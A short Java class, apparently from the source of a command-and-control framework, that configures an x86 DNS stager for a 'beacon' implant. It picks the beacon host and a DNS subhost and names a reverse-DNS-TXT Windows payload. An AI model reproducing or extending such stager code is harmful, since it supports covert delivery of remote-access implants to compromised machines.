package stagers;

import common.Listener;

public class BeaconDNSStagerX86
        extends GenericDNSStagerX86 {
    public BeaconDNSStagerX86(Listener l) {
        super(l);
    }

    @Override
    public String getDNSHost() {
        return this.getListener().getBeaconHosts()[0];
    }

    @Override
    public String payload() {
        return "windows/beacon_dns/reverse_dns_txt";
    }

    @Override
    public String getHost() {
        if (!"".equals(this.getConfig().getDNSSubhost())) {
            return this.getConfig().getDNSSubhost() + this.getDNSHost();
        }
        return super.getHost();
    }
}

